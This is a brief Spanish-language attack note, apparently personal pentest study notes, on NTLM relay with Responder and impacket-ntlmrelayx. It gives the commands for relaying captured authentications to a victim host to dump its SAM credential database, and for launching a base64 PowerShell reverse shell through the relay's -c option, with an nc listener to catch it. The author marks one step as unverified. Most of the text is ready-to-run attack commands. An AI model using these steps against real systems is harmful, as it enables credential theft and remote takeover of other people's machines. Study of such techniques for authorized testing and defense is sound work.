[[Responder - Inveigh]]

Para poder usarlo dejamos el responder corriendo (NO SE SI ESTO ES CORRECTO COMPROBAR)

Después configuramos el SMB = off en nuestro archivo: 
```
sudo nano /etc/responder/Responder.conf
```

Una vez hecho esto ejecutamos lo siguiente:
```
impacket-ntlmrelayx --no-http-server -smb2support -t [IP_VICTIMA]
```
Esto nos volcará la SAM

# Reverse Shell
Con la opción -C podemos hacer una reverse shell directamente, vamos a verlo:

Primero en la página [https://www.revshells.com/](https://www.revshells.com/) Seleccionaremos la opcion 3 de powershell con el encoding en base64. Y después ejecutamos el comando:
```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e [REV_SHELL_POWERSHELL#3_BASE64]'
```
Esto hará que cuando una víctima se autentica en nuestro servidor envenenamos la respuesta y ejcutará la reverse shell.

Obviamente tendremos que estar a la escucha para recibirla:
```
nc -lvnp 9000
```